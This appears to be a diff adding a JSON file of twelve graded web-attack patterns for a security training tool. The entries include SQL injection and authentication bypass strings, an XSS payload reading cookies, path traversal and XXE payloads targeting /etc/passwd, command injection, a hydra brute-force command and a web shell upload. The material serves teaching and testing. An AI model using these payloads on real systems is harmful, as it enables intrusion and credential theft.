@@ -1,0 +1,110 @@
+[
+  {
+    "id": 1,
+    "name": "SQL Injection",
+    "pattern": "' OR '1'='1",
+    "hint": "Test for SQL injection vulnerability",
+    "example": "SELECT * FROM users WHERE id = '1' OR '1'='1'",
+    "level": "Beginner",
+    "category": "Injection"
+  },
+  {
+    "id": 2,
+    "name": "XSS Payload",
+    "pattern": "<script>alert('XSS')</script>",
+    "hint": "Cross-site scripting test",
+    "example": "<img src=x onerror='alert(document.cookie)'>",
+    "level": "Beginner",
+    "category": "Injection"
+  },
+  {
+    "id": 3,
+    "name": "CSRF Test",
+    "pattern": "POST /transfer?amount=1000&to=attacker",
+    "hint": "Cross-site request forgery",
+    "example": "curl -X POST http://localhost/transfer",
+    "level": "Intermediate",
+    "category": "CSRF"
+  },
+  {
+    "id": 4,
+    "name": "Authentication Bypass",
+    "pattern": "admin' --",
+    "hint": "SQL comment injection for bypass",
+    "example": "SELECT * FROM users WHERE username='admin' --'",
+    "level": "Intermediate",
+    "category": "Bypass"
+  },
+  {
+    "id": 5,
+    "name": "Brute Force",
+    "pattern": "for i in range(10000): login(user, password)",
+    "hint": "Dictionary attack on login",
+    "example": "hydra -l admin -P passwords.txt http://localhost",
+    "level": "Beginner",
+    "category": "Brute Force"
+  },
+  {
+    "id": 6,
+    "name": "Path Traversal",
+    "pattern": "../../../etc/passwd",
+    "hint": "Directory traversal test",
+    "example": "curl http://localhost/file.php?path=../../../../etc/passwd",
+    "level": "Intermediate",
+    "category": "Traversal"
+  },
+  {
+    "id": 7,
+    "name": "Command Injection",
+    "pattern": "; cat /etc/passwd",
+    "hint": "OS command injection",
+    "example": "ping -c 1 8.8.8.8; whoami",
+    "level": "Advanced",
+    "category": "Injection"
+  },
+  {
+    "id": 8,
+    "name": "File Upload",
+    "pattern": "shell.php (malicious)",
+    "hint": "Upload executable file",
+    "example": "curl -F 'file=@shell.php' http://localhost/upload",
+    "level": "Advanced",
+    "category": "Upload"
+  },
+  {
+    "id": 9,
+    "name": "LDAP Injection",
+    "pattern": "*",
+    "hint": "LDAP wildcard injection",
+    "example": "(&(uid=*)(password=*))",
+    "level": "Advanced",
+    "category": "Injection"
+  },
+  {
+    "id": 10,
+    "name": "XML Injection",
+    "pattern": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
+    "hint": "XML external entity injection",
+    "example": "POST with XXE payload",
+    "level": "Advanced",
+    "category": "Injection"
+  },
+  {
+    "id": 11,
+    "name": "API Enumeration",
+    "pattern": "curl http://localhost/api/v1/users",
+    "hint": "Discover API endpoints",
+    "example": "curl -X GET http://localhost/api/",
+    "level": "Beginner",
+    "category": "Reconnaissance"
+  },
+  {
+    "id": 12,
+    "name": "Session Hijacking",
+    "pattern": "Use stolen session token",
+    "hint": "Replay session token",
+    "example": "curl -H 'Cookie: sess_token=...' http://localhost",
+    "level": "Intermediate",
+    "category": "Session"
+  }
+]
